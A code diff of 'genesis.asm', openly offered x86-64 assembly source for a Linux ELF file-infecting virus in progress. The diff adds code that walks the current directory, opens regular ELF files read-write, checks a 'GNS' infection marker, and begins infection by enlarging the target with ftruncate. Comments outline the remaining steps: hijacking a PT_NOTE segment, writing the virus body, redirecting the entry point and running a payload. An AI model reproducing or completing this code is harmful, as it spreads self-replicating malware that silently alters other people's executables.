@@ -1,6 +1,6 @@
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-;;                                                             genesis.asm ;;
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
+;@;                                                           genesis.asm ;@;
+;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
 
 ; nasm -f elf64 genesis.asm -o genesis.o
 ; ld genesis.o -o genesis
@@ -29,27 +29,29 @@ _start: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   test  rax,  rax             ; if (rax < 0)
   jl    VExitRoutine          ;   exit()
 
-  sub   rsp,  0x04            ; place for magic
-  push  0x00
+  sub   rsp,  0x10            ; alloc 4 elf_magic
   push  rax                   ; save fd
-  push  0x00                  ; bytes read ( thanks vrzh )
+  push  0x00                  ; bytes read
   sub   rsp,  SZ_DENT
   
   GetDents64 [rsp + SZ_DENT + 8], rsp, SZ_DENT  ; GetDents64(fd, buf, buflen)
   test  rax,  rax
   jl    .EnumDirDone
 
-  xor   rcx,  rcx             ; Counter   = 0
+  xor   r9,   r9             ; Counter   = 0
   mov   [rsp + SZ_DENT],  rax ; EndCount  = rax
-
+  
   .EnumFiles:
-    cmp   byte [rsp + rcx + linux_dirent64.d_type], DT_REG
+    xor   rax,  rax
+    mov   al, byte [rsp + r9 + linux_dirent64.d_type]
+    lea   rax,  [rsp + r9 + linux_dirent64.d_name]
+    cmp   byte [rsp + r9 + linux_dirent64.d_type], DT_REG
     jne   .NextIteration
 
-    ;; GET FILE >-------------------------------------------------------------<
+    ;; GET FILE >-----------------------------------------------------------<
     
-    lea   r13, [rsp + rcx + linux_dirent64.d_name]
-    
+    lea   r13, [rsp + r9 + linux_dirent64.d_name]
+
     Open  r13,  0x00,   O_RDWR
     test  rax,  rax
     jl   .NextIteration
@@ -57,25 +59,22 @@ _start: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
     mov   rbx,  rax   ; save fd
     
     lea   r14,  [rsp + SZ_DENT + 16]
-    Read  rbx,  r14, 4
-    cmp   rax,  0x04
+    Read  rbx,  r14, 0x10
+    cmp   rax,  0x10
     jne   .NextFile
 
-    ;; CHECK IF ELF >---------------------------------------------------------<
+    ;; CHECK IF ELF >-------------------------------------------------------<
     
     cmp   dword [r14], ELF_MAGIC
     jne   .NextFile
 
-    ;; CHECK ALREADY INFECTED >-----------------------------------------------<
+    ;; CHECK ALREADY INFECTED >---------------------------------------------<
+
+    mov   eax, dword [r14 + 0xC]
+    cmp   eax, 0x534e4700         ; Check for "GNS" in Padding
+    je    .NextFile               ; Already Infected
     
-    nop
-    nop
-    nop
-
-    ;;;; IF NOT -> CONTINUE >-------------------------------------------------<
-    ;;;; ELSE -> EXIT >-------------------------------------------------------<
-    jne   .NextFile
-
+    ;; INFECT FILE >--------------------------------------------------------<
     call  Infect
     jmp   .EnumDirDone
 
@@ -83,8 +82,8 @@ _start: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
     Close rbx
 
   .NextIteration:
-    add   cx, word [rsp + linux_dirent64.d_reclen]  ; len
-    cmp   cx, word [rsp + SZ_DENT]                  ; bytes_read
+    add   r9w, word [rsp + linux_dirent64.d_reclen]  ; len
+    cmp   r9w, word [rsp + SZ_DENT]                  ; bytes_read
     jne   .EnumFiles
 
 .EnumDirDone:
@@ -92,32 +91,52 @@ _start: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   add   rsp, SZ_DENT
   pop   rdi
   Close [rsp]
+  jmp   VExitRoutine
 
-
-VExitRoutine: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
-  Exit 0x00
-
-Infect:
+Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   push  rbp
-  sub   rsp,  0x00
+  mov   rbp,  rsp
+  sub   rsp,  0x90 
 
   ;; STAT + MMAP >----------------------------------------------------------<
   
-  mov rdi, r13
+  FStat rdi,  rsp
+  test  rax,  rax
+  jne   .InfectExit
   
-  nop
-  nop
-  nop
+  ; extend filesize (ftruncate)
+  xor   rbx,  rbx
+  mov   rbx,  VExitRoutine
+  mov   rax,  _start
+  sub   rbx,  rax
+
+  mov   r10,  [rsp + stat.st_size]  ; save copy :)
+
+  add   rbx,  [rsp + stat.st_size]  ; host + vx
+  add   rsp,  0x90                  ; free my boi stack, he aint do nun' wrong
+
+  xor   rsi,  rsi
+  FTruncate   rdi,  rbx
+  test  rax,  rax
+  jne   .InfectExit
+
+  ; Mmap(...)
 
   ;; SAVE OLD ENTRY >-------------------------------------------------------<
   ;; LOOP THROUGH PHDR >----------------------------------------------------<
-  ;;;; IF PH_TYPE -> PT_NOTE THEN BREAK >-----------------------------------<
+  ;;;; IF PH_TYPE == PT_NOTE THEN BREAK >-----------------------------------<
   ;; CONVERT TO PT_LOAD >---------------------------------------------------<
   ;; WRITE SELF AT LOCATION >-----------------------------------------------<
   ;; OVERWRITE ENTRYPOINT >-------------------------------------------------<
   ;; WRITE OLD ENTRYPOINT AT SELF >-----------------------------------------<
+  ;; WRITE SIGNATURE >------------------------------------------------------<
   ;; EXEC PAYLOAD (PRINT STDOUT) >------------------------------------------<
 
+  .InfectExit:
   xor   rax,  rax
+  mov   rsp,  rbp
   pop   rbp
   ret
+
+VExitRoutine: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
+  Exit 0x00
